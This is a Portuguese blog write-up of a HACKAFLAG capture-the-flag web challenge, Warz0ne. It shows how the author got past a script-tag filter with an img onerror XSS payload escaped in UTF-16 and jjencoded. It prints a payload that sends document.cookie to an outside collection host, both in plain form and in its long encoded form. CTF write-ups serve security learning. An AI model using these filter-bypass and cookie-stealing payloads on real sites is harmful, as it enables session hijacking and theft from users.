---
layout: post
title: "HACKAFLAG — ETAPA DENNIS RITCHIE: Warz0ne"
data: "20/03/2020"
excerpts: "Resolução do desafio de web do HF: Warz0ne"
keywords: "warz0ne, xss, javascript, writeup"
type: "article"
card: "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/image.png"
---
<div class="col-12 col-sm-12 col-md-12 col-lg-4 col-xl-4 mb-3">
  <div class="list-group" id="list-tab">
    <a class="list-group-item list-group-item-action bg-dark text-white" href="#warz0ne">HACKAFLAG — ETAPA DENNIS RITCHIE: Warz0ne</a>
    <a class="list-group-item list-group-item-action bg-dark text-white" href="#references">Fontes</a>
  </div>
</div>
<div class="col-12 col-sm-12 col-md-12 col-lg-6 col-xl-6 mb-3">
  <div data-bs-spy="scroll" data-bs-target="#list-tab" data-bs-offset="0" class="scrollspy-example" tabindex="0">
    <section>
      <h1 class="fw-bold" id="warz0ne">HACKAFLAG — ETAPA DENNIS RITCHIE: Warz0ne</h1>
      <p>Esta é uma resolução de um desafio de web do HF: Warz0ne.</p>
      <p>Acessando a url que o desafio nos dava, http://159.65.249.122:8585/, era possível encontrar uma aplicação, que em resumo, pegava o valor passado no input e o transcrevia na página em UPPERCASE.</p>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/1.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">Testando a aplicação</figcaption>
      </figure>
      <br />
      <br />
      <p>A partir daí, tentei executar um alert(1), porém sem sucesso pois eu vi que a tag script estava sendo barrada pelo backend, sendo assim, pensei em procurar quais eram as possíveis tags que estavam sendo barradas:</p>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/2.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">Encontrando parte de uma possível block list</figcaption>
      </figure>
      <br />
      <br />
      <p>Sendo assim, encodei o payload que eu passava para ver se mesmo assim era barrado ou se seria executado.</p>
      <p>O primeiro payload que testei foi:</p>
      <pre>&lt;img src=x onerror=alert(1)&gt;</pre>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/3.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">Tentando executar um alert(1)</figcaption>
      </figure>
      <br />
      <br />
      <p>Encodei img, src e onerror com UTF-16:</p>
      <pre>&lt;\u0069\u006d\u0067 \u0073\u0072\u0063=x \u006f\u006e\u0065\u0072\u0072\u006f\u0072=alert(1)&gt;</pre>
      <p>Porém o alert não foi executado e no console dizia “ALERT is not defined”, ou seja, o alert tinha que estar encodado também. Mas mesmo encodando com UTF-16 continuava dando o mesmo erro, a partir disso fui procurar algum bypass no google e encontrei! Encontrei que se eu encodasse primeiramente com jsfuck ou jjencode e depois com UTF-16 o alert seria executado. Maasss…. tinha um problema: com jsfuck o payload fica ENORME e excedia o limite de tamanho em um http header, logo mudei para o jjencode e tudo ficou ok!</p>
      <p>Encodando o alert(1) com jjencode e logo em seguida com UTF-16, o payload:</p>
      <p><pre>&lt;img src=x onerror=alert(1)&gt;</pre></p>
      <p>Ficou assim:</p>
      <pre>&lt;\u0069\u006d\u0067 \u0073\u0072\u0063=x \u006f\u006e\u0065\u0072\u0072\u006f\u0072=\u0024\u003d\u007e\u005b\u005d\u003b\u0024\u003d\u007b\u005f\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u0024\u003a\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u005f\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u005f\u003a\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u0024\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u0024\u003a\u0028\u007b\u007d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u0024\u005f\u0024\u003a\u0028\u0024\u005b\u0024\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u0024\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u005f\u003a\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u005f\u005f\u003a\u0028\u007b\u007d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u0024\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u005f\u0024\u003a\u002b\u002b\u0024\u007d\u003b\u0024\u002e\u0024\u005f\u003d\u0028\u0024\u002e\u0024\u005f\u003d\u0024\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u0024\u005f\u0024\u005d\u002b\u0028\u0024\u002e\u005f\u0024\u003d\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0024\u002e\u0024\u0024\u003d\u0028\u0024\u002e\u0024\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0028\u0021\u0024\u0029\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u0024\u005d\u002b\u0028\u0024\u002e\u005f\u005f\u003d\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u0024\u0024\u005f\u005d\u0029\u002b\u0028\u0024\u002e\u0024\u003d\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0024\u002e\u005f\u003d\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u0029\u002b\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u0024\u005f\u0024\u005d\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u0024\u003b\u0024\u002e\u0024\u0024\u003d\u0024\u002e\u0024\u002b\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u0024\u005d\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u002b\u0024\u002e\u0024\u002b\u0024\u002e\u0024\u0024\u003b\u0024\u002e\u0024\u003d\u0028\u0024\u002e\u005f\u005f\u005f\u0029\u005b\u0024\u002e\u0024\u005f\u005d\u005b\u0024\u002e\u0024\u005f\u005d\u003b\u0024\u002e\u0024\u0028\u0024\u002e\u0024\u0028\u0024\u002e\u0024\u0024\u002b\u0022\u005c\u0022\u0022\u002b\u0024\u002e\u0024\u005f\u0024\u005f\u002b\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u0024\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0022\u0028\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0022\u0029\u0022\u002b\u0022\u005c\u0022\u0022\u0029\u0028\u0029\u0029\u0028\u0029\u003b&gt;</pre>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/4.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">Execução do alert(1)</figcaption>
      </figure>
      <br />
      <br />
      <p>A partir disso era só criar um payload que pegava o cookie e o enviava para um servidor de controle seu. E esse payload seria enviado no /contact da aplicação.</p>
      <p>Payload: <pre>&lt;img src=x onerror=location=&#39;https://mlkzika.free.beeceptor.com/?cookie=&#39;+document.cookie&gt;</pre></p>
      <p>O trecho abaixo foi encodado jjencode e depois com UTF-16:</p>
      <pre>location=&#39;https://mlkzika.free.beeceptor.com/?cookie=&#39;+document.cookie</pre>
      <p>Payload final:</p>
      <pre>&lt;\u0069\u006d\u0067 \u0073\u0072\u0063=x \u006f\u006e\u0065\u0072\u0072\u006f\u0072=\u0024\u003d\u007e\u005b\u005d\u003b\u0024\u003d\u007b\u005f\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u0024\u003a\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u005f\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u005f\u003a\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u0024\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u0024\u003a\u0028\u007b\u007d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u0024\u005f\u0024\u003a\u0028\u0024\u005b\u0024\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u005f\u0024\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u005f\u003a\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u005f\u005f\u003a\u0028\u007b\u007d\u002b\u0022\u0022\u0029\u005b\u0024\u005d\u002c\u0024\u0024\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u0024\u0024\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u005f\u005f\u003a\u002b\u002b\u0024\u002c\u0024\u005f\u005f\u0024\u003a\u002b\u002b\u0024\u007d\u003b\u0024\u002e\u0024\u005f\u003d\u0028\u0024\u002e\u0024\u005f\u003d\u0024\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u0024\u005f\u0024\u005d\u002b\u0028\u0024\u002e\u005f\u0024\u003d\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0024\u002e\u0024\u0024\u003d\u0028\u0024\u002e\u0024\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0028\u0021\u0024\u0029\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u0024\u005d\u002b\u0028\u0024\u002e\u005f\u005f\u003d\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u0024\u0024\u005f\u005d\u0029\u002b\u0028\u0024\u002e\u0024\u003d\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u005f\u0024\u005d\u0029\u002b\u0028\u0024\u002e\u005f\u003d\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u0029\u002b\u0024\u002e\u0024\u005f\u005b\u0024\u002e\u0024\u005f\u0024\u005d\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u0024\u003b\u0024\u002e\u0024\u0024\u003d\u0024\u002e\u0024\u002b\u0028\u0021\u0022\u0022\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u0024\u005d\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u002b\u0024\u002e\u0024\u002b\u0024\u002e\u0024\u0024\u003b\u0024\u002e\u0024\u003d\u0028\u0024\u002e\u005f\u005f\u005f\u0029\u005b\u0024\u002e\u0024\u005f\u005d\u005b\u0024\u002e\u0024\u005f\u005d\u003b\u0024\u002e\u0024\u0028\u0024\u002e\u0024\u0028\u0024\u002e\u0024\u0024\u002b\u0022\u005c\u0022\u0022\u002b\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u005f\u002b\u0024\u002e\u0024\u005f\u0024\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0022\u003d\u0027\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u005f\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u005f\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u0024\u0024\u002b\u0022\u003a\u002f\u002f\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0028\u0021\u005b\u005d\u002b\u0022\u0022\u0029\u005b\u0024\u002e\u005f\u0024\u005f\u005d\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u0024\u002b\u0024\u002e\u005f\u0024\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u005f\u002b\u0022\u002e\u0022\u002b\u0024\u002e\u0024\u0024\u0024\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u0024\u005f\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u002e\u0022\u002b\u0024\u002e\u0024\u005f\u0024\u0024\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0024\u002e\u0024\u0024\u005f\u005f\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u005f\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u0024\u005f\u002b\u0022\u002e\u0022\u002b\u0024\u002e\u0024\u0024\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0022\u002f\u003f\u0022\u002b\u0024\u002e\u0024\u0024\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u003d\u0027\u002b\u0022\u002b\u0024\u002e\u0024\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u005f\u002b\u0024\u002e\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u005f\u002b\u0024\u002e\u005f\u005f\u002b\u0022\u002e\u0022\u002b\u0024\u002e\u0024\u0024\u005f\u005f\u002b\u0024\u002e\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u0024\u0024\u002b\u0022\u005c\u005c\u0022\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u005f\u0024\u002b\u0024\u002e\u005f\u005f\u0024\u002b\u0024\u002e\u0024\u0024\u0024\u005f\u002b\u0022\u005c\u0022\u0022\u0029\u0028\u0029\u0029\u0028\u0029\u003b&gt;</pre>
      <p>E o enviei para o /contact:</p>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/5.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">/contact da aplicação</figcaption>
      </figure>
      <br />
      <br />
      <p>Era só necessário quebrar o “captcha” (o script está no github da minha equipe):</p>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/6.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">Quebrando o "captcha"</figcaption>
      </figure>
      <br />
      <br />
      <p>E depois enviar no campo url do /contact: http://159.65.249.122:8585/?msg=PAYLOAD.</p>
      <p>E, por fim, só acessar o seu servidor e ver as requisições, e lá estava a flag!</p>
      <figure class="figure">
        <img src="{{ "/assets/images/hackaflag-etapa-dennis-ritchie-warz0ne/7.png" | relative_url }}" class="figure-img img-fluid rounded" alt="..." />
        <figcaption class="figure-caption text-center fw-bold fst-italic">FLAG</figcaption>
      </figure>
      <br />
      <br />
      <p>Flag: <pre>HACKAFLAG{Insira_Um4_fl4g_4qu1}</pre></p>
      <br />
      <h4 class="fw-bold" id="references">Fontes:</h4>
      <p><a class="btn btn-dark text-white" href="https://xssor.io/">XSS&#39;OR - Hack with JavaScript</a></p>
      <p><a class="btn btn-dark text-white" href="http://www.jsfuck.com/">JSFuck - Write any JavaScript with 6 Characters: []()!+</a></p>
      <p><a class="btn btn-dark text-white" href="https://utf-8.jp/public/jjencode.html">jjencode - Encode any JavaScript program using only symbols</a></p>
      <p><a class="btn btn-dark text-white" href="https://github.com/0x8LayerTeam/CTF-Writeups">0x8Layer Team - CTF Writeups</a></p>
    </section>
  </div>
</div>
